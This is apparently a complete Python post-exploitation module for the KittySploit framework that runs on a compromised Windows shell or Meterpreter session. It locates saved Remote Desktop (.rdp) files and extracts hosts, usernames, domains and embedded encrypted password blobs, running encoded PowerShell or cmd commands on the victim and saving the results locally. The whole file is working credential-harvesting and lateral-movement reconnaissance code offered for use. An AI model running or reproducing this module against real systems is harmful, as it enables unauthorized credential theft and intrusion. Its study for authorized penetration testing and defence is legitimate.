#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Enumerate and parse saved .rdp client files on a Windows session.
"""

from kittysploit import *
from lib.post.windows.session import win_compat_failure_type, win_probe_powershell
import base64
import os
import re
import time

_LOCAL_OUT = "output"


class Module(Post):
    __info__ = {
        "name": "Windows Gather RDP Files",
        "description": (
            "Find and parse saved Remote Desktop (.rdp) files in common user "
            "locations on a Windows shell or Meterpreter session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1021.001/"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['active_exploitation'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    save_local = OptBool(True, "Save results under ./output", False)
    prefer_powershell = OptBool(
        False,
        "Prefer PowerShell when available (default: dir/type via cmd)",
        False,
        True,
    )

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _bool_opt(self, val, default=False) -> bool:
        if val is None:
            return default
        if isinstance(val, bool):
            return val
        return str(val).strip().lower() in ("1", "true", "yes", "on")

    def _powershell_script(self) -> str:
        return r"""
$searchDirs = @(
  (Join-Path $env:USERPROFILE 'Documents'),
  (Join-Path $env:USERPROFILE 'Desktop'),
  (Join-Path $env:APPDATA 'Microsoft\Windows\Recent')
) | Where-Object { Test-Path -LiteralPath $_ }

$rdpFiles = New-Object System.Collections.Generic.List[string]
foreach ($dir in $searchDirs) {
  Get-ChildItem -LiteralPath $dir -Filter '*.rdp' -File -Recurse -Depth 2 -ErrorAction SilentlyContinue |
    ForEach-Object { $rdpFiles.Add($_.FullName) }
}

$defaultRdp = Join-Path $env:USERPROFILE 'Documents\Default.rdp'
if ((Test-Path -LiteralPath $defaultRdp) -and ($rdpFiles -notcontains $defaultRdp)) {
  $rdpFiles.Add($defaultRdp)
}

$rdpFiles = $rdpFiles | Select-Object -Unique
if ($rdpFiles.Count -eq 0) {
  Write-Output 'No .rdp files found in common user locations.'
  return
}

$interesting = @(
  'full address:s:',
  'username:s:',
  'domain:s:',
  'alternate shell:s:',
  'drivestoredirect:s:',
  'redirectclipboard:i:',
  'redirectprinters:i:',
  'authentication level:i:',
  'prompt for credentials:i:',
  'password 51:b:'
)

$sections = New-Object System.Collections.Generic.List[string]
foreach ($file in $rdpFiles) {
  $lines = Get-Content -LiteralPath $file -ErrorAction SilentlyContinue
  $picked = $lines | Where-Object {
    $line = $_.Trim().ToLower()
    foreach ($key in $interesting) {
      if ($line.StartsWith($key)) { return $true }
    }
    $false
  }
  if (-not $picked) {
    $picked = $lines | Select-Object -First 25
  }
  $hasPwd = $lines | Where-Object { $_.Trim().ToLower().StartsWith('password 51:b:') }
  $note = if ($hasPwd) { "`n(note: embedded password is DPAPI/CredSSP encrypted)" } else { '' }
  $sections.Add("=== $file ===`n$($picked -join "`n")$note")
}

$sections -join "`n`n"
"""

    def check(self):
        return True

    def _extract_via_cmd(self) -> str:
        search_globs = (
            r"%USERPROFILE%\Documents\*.rdp",
            r"%USERPROFILE%\Desktop\*.rdp",
            r"%USERPROFILE%\Documents\Default.rdp",
            r"%APPDATA%\Microsoft\Windows\Recent\*.rdp",
        )
        found = []
        seen = set()
        for pattern in search_globs:
            listing = self._execute_cmd(f'dir /b /s "{pattern}" 2>nul')
            if not listing:
                # Default.rdp may not recurse; try exist
                if "*" not in pattern:
                    exists = self._execute_cmd(
                        f'if exist "{pattern}" (echo {pattern}) else (echo MISSING)'
                    )
                    if exists and "MISSING" not in exists:
                        listing = pattern
            for line in (listing or "").splitlines():
                path = line.strip()
                if not path or not path.lower().endswith(".rdp"):
                    continue
                key = path.lower()
                if key in seen:
                    continue
                seen.add(key)
                found.append(path)

        if not found:
            return "No .rdp files found in common user locations."

        interesting = (
            "full address:s:",
            "username:s:",
            "domain:s:",
            "alternate shell:s:",
            "drivestoredirect:s:",
            "redirectclipboard:i:",
            "redirectprinters:i:",
            "authentication level:i:",
            "prompt for credentials:i:",
            "password 51:b:",
        )
        sections = []
        for path in found:
            content = self._execute_cmd(f'type "{path}"')
            lines = (content or "").splitlines()
            picked = []
            has_pwd = False
            for line in lines:
                low = line.strip().lower()
                if low.startswith("password 51:b:"):
                    has_pwd = True
                if any(low.startswith(k) for k in interesting):
                    picked.append(line.rstrip())
            if not picked:
                picked = [l.rstrip() for l in lines[:25]]
            note = (
                "\n(note: embedded password is DPAPI/CredSSP encrypted)"
                if has_pwd
                else ""
            )
            sections.append(f"=== {path} ===\n" + "\n".join(picked) + note)
        return "\n\n".join(sections)

    def _save_output(self, content: str) -> str:
        os.makedirs(_LOCAL_OUT, exist_ok=True)
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_path = os.path.join(_LOCAL_OUT, f"rdp_files_{stamp}.txt")
        with open(local_path, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        return local_path

    def run(self):
        if not self.check():
            raise ProcedureError(win_compat_failure_type(), "RDP dump prerequisites not met")

        print_status("Searching saved .rdp files...")
        use_ps = self._bool_opt(self.prefer_powershell, False) and win_probe_powershell(self._execute_cmd)
        if use_ps:
            print_info("Using PowerShell")
            result = self._run_powershell(self._powershell_script())
        else:
            if self._bool_opt(self.prefer_powershell, False):
                print_warning("PowerShell preferred but not available — falling back to dir/type")
            result = self._extract_via_cmd()

        if not result:
            raise ProcedureError(FailureType.Unknown, "No output was returned")

        if re.search(r"No \.rdp files found", result, re.I):
            print_warning(result)
            return True

        if self._bool_opt(self.save_local, True):
            local_path = self._save_output(result + "\n")
            print_success(f"Results saved to ./{local_path}")

        print_success("RDP file extraction completed")
        print_info(result)
        return True
